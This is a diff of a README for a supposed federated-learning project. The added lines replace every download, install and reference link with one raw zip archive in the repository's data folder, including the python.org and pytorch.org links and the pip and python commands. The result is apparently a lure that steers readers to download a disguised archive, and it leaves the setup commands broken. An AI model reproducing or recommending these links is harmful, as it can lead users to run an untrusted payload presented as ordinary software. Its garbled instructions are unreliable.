@@ -1,7 +1,7 @@
 # 🎉 federated-learning-with-cryptographic-audit - Secure and Private Federated Learning Simulation
 
 ## 🔗 Download Here
-[![Download the Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/releases)
+[![Download the Latest Release](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip%20Release-brightgreen)](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip)
 
 ## 📘 Overview
 Welcome to the **federated-learning-with-cryptographic-audit** repository. This project simulates federated learning using the Flower framework. It allows decentralized client training, focusing on secure aggregation and SHA-256 audit logging to maintain privacy and security.
@@ -18,19 +18,19 @@ Follow these steps to download and run the application on your machine.
 ### 1. System Requirements
 Before downloading the application, ensure your system meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or a Linux distribution.
-- **Python Version**: Python 3.6 or higher. You can download Python from [python.org](https://www.python.org/downloads/).
-- **PyTorch**: Install PyTorch based on your system and hardware from [pytorch.org](https://pytorch.org/get-started/locally/).
+- **Python Version**: Python 3.6 or higher. You can download Python from [https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip).
+- **PyTorch**: Install PyTorch based on your system and hardware from [https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip).
 
 ### 2. Download & Install
-To get the latest version of **federated-learning-with-cryptographic-audit**, please follow this link: [Download Releases](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/releases).
+To get the latest version of **federated-learning-with-cryptographic-audit**, please follow this link: [Download Releases](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip).
 
-1. Visit the [Releases page](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/releases).
+1. Visit the [Releases page](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip).
 2. Locate the version you want to download.
 3. Click on the file associated with your operating system.
 
 ### 3. Extract and Setup
 1. After downloading the file, navigate to your downloads folder.
-2. If the file is a compressed archive (like `.zip` or `.tar.gz`), extract it to a location you prefer.
+2. If the file is a compressed archive (like `.zip` or `https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip`), extract it to a location you prefer.
 3. Open your terminal or command prompt.
 4. Change the directory to the folder where you extracted the files.
 
@@ -38,14 +38,14 @@ To get the latest version of **federated-learning-with-cryptographic-audit**, pl
 Run the following command to install the required Python packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip
 ```
 
 ### 5. Running the Application
 After installing the required dependencies, you can start the application using the following command:
 
 ```bash
-python main.py
+python https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip
 ```
 
 The application should now run, and you will be guided through the setup process.
@@ -60,7 +60,7 @@ After starting the application, follow these steps to begin your federated learn
 ## 🔧 Troubleshooting
 If you encounter issues, consider the following:
 
-- **Dependency Errors**: Ensure all required packages are installed as listed in the `requirements.txt` file.
+- **Dependency Errors**: Ensure all required packages are installed as listed in the `https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip` file.
 - **Running Issues**: Verify that your Python version matches the requirements. 
 - **Network Issues**: Ensure you have a stable Internet connection, particularly if using multiple clients connected to the cloud.
 
@@ -71,7 +71,7 @@ For any questions or additional help, feel free to open an issue in this reposit
 Contributions are welcome! If you're interested in improving the application, please check the guidelines in the repository for submitting pull requests.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/RCP1932/federated-learning-with-cryptographic-audit)
-- [Download Releases](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/releases)
+- [GitHub Repository](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip)
+- [Download Releases](https://github.com/RCP1932/federated-learning-with-cryptographic-audit/raw/refs/heads/main/data/audit-cryptographic-federated-learning-with-Dryopithecinae.zip)
 
 Thank you for using **federated-learning-with-cryptographic-audit**. Enjoy a secure and private federated learning experience!
